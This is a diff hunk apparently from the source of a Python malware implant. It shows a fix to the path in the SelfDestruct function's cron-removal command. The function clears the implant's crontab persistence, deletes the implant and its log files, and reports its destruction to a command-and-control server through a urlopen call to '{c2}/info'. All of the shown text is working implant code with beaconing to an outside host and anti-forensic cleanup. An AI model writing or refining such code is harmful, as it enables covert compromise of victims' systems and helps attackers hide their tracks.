@@ -25,7 +25,7 @@ def UpdateImplant(implantDir):
 #This will self destruct our implant.
 def SelfDestruct(implantDir):
     #urllib.request.urlopen(f'{c2}/destruct?sid={sid}')
-    os.system(f'crontab -l | grep -v "{implantDir}implant.py"  | crontab -')
+    os.system(f'crontab -l | grep -v "{implantDir}/implant.py"  | crontab -')
     os.system(f'rm {implantDir}/sid.log; rm {implantDir}/implant.py')
     destructMsg = urllib.parse.quote_plus("Implant has self destructed")
     urllib.request.urlopen(f'{c2}/info?info={destructMsg}&sid={sid}')
